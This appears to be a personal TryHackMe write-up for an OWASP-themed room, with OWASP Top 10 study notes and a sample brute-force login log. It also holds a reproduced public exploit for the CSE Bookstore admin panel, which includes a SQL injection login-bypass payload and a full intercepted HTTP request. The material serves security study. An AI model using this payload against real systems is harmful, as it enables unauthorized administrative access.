---
layout: writeup
title: "/owasp"
permalink: "/writeups/tryhackme/owasp/"
platform: "TryHackMe"
writeup_type: "room"
room_name: "Owasp"
---

<section class="page-hero panel">
  <p class="eyebrow">root@rumais:~# inspect owasp</p>
  <h1>Owasp</h1>
  <p>Web-facing lab centered on application testing, content discovery, misconfiguration abuse, and foothold development. This page consolidates local notes, recovered artifacts, and cleaned-up workflow guidance with sensitive answers and flags redacted.</p>
</section>

<section class="panel">
  <h2>Room Profile</h2>
  <p>Built from supporting notes and artifacts. This room is grouped under <strong>Web and App Security</strong>.</p>
  <div class="tag-list">
    <span class="tag">Web and App Security</span>
    <span class="tag">3 docx note</span>
  </div>
</section>

<section class="panel">
  <h2>Workflow Focus</h2>
  <p>Web-facing lab centered on application testing, content discovery, misconfiguration abuse, and foothold development. Use the recovered artifacts below as the evidence base for enumeration, access development, and post-exploitation review.</p>
</section>

## Operator Notes

## Recon

- The web application is the main attack surface, so content discovery, login behavior, and hidden paths matter immediately.
- Owasp rewards careful note-taking and stepwise validation rather than trial-and-error execution.

## Initial Access

- The intended foothold comes from chaining application flaws, exposed content, or weak credentials into code execution or authenticated access.
- The room path becomes clear once the recovered artifacts and service behavior are linked together.

## Privilege Escalation

- Once the app is compromised, the next step is to stabilize host access and enumerate for the final path to proof material.
- After the foothold, local context matters more than noisy exploitation.

## Defensive Takeaway

- The defensive lesson is that web compromise rarely stays in the web tier when secrets, upload paths, or admin functions are exposed.

## Supporting Notes

### 48960

# Exploit Title: CSE Bookstore Authentication Bypass
# Date: 27/10/2020
# Exploit Author: Alper Basaran
# Vendor Homepage: https://projectworlds.in/
# Software Link: https://github.com/projectworlds32/online-book-store-project-in-php/archive/master.zip
# Version: 1.0
# Tested on: Windows 10 Enterprise 1909
CSE Bookstore is vulnerable to an authentication bypass vulnerability on the admin panel.
By default the admin panel is located at /admin.php and the administrator interface can be accessed by unauthorized users exploiting the SQL injection vulnerability.
Payload:
Name: admin
Pass: %' or '1'='1
Sample BurpSuite intercept:
POST /bookstore/admin_verify.php HTTP/1.1
Host: 192.168.20.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: http://192.168.20.131
Connection: close
Referer: http://192.168.20.131/bookstore/admin.php
Cookie: PHPSESSID=hmqnib0ihkvo235jor7mpfoupv
Upgrade-Insecure-Requests: 1
name=admin&pass=%25%27+or+%271%27%3D%271&submit=Submit+Query

### Owasp 10

******Open Web Application Security Project********
## top 10 vulnerabilities
1- Injection
2- Broken Authentication
3- Sensitive Data Exposure
4- XML External Entity
5- Broken Access Control
6- Security Misconfiguration
7- Cross-site Scripting
8- Insecure Deserialization
9- Components with Known Vulnerabilities
10-Insufficent Logging & Monitoring
1- Injection
--SQL Injection: user controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries.
--Command Injection: user input is passed to system commands. As a result, an attacker is able to execute arbitrary system commands on application servers.
*******-Prevention******
The main defence for preventing injection attacks is ensuring that user controlled input is not interpreted as queries or commands.
--Using an allow list {compare with safe inputs/characters}
--Stripping inputs {remove dangerous character in input}
task eg: kernal command excutable in webpage {bad php program 'passthru()' }
2- Broken Authentication
--Brute force attacks
--Use of weak credentials
--Weak Session Cookies  [Session cookies are how the server keeps track of users. If session cookies contain predictable values, an attacker can set their own session cookies and access users’ accounts.]
********prevention*********
--strong password policy
--lockout after a certain number of attempts
--implement multifactor authentiocATION
task eg: got username exist, then register another user with space begining . After logi with new user got full control of existing user.
3- Sensitive Data Exposure
When a webapp accidentally reveals sensitive data
task eg: viewing page sourse got a /assets where a file webapp.db database (mysqlite3), enumerating webapp.db got credentials.
4- XML External Entities
is a vulnerability that abuses features of XML parsers/data. Also cause DoS or use to perform SSRF{server sserver side forgery
XML (eXtensible Markup Language).
DTD stands for Document Type Definition.
5- Broken Access Control
IDOR=Insecure Direct Object Reference
is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access
eg: https://example.com/bank?account_number=1234 here we can change a/c number to get access to differnt a/c.
6- Security Misconfiguration
Poorly configured permissions on cloud services, like S3 buckets
Having unnecessary features enabled, like services, pages, accounts or privileges
D

### Login Logs

200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
200 OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
200 OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
200 OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
200 OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login
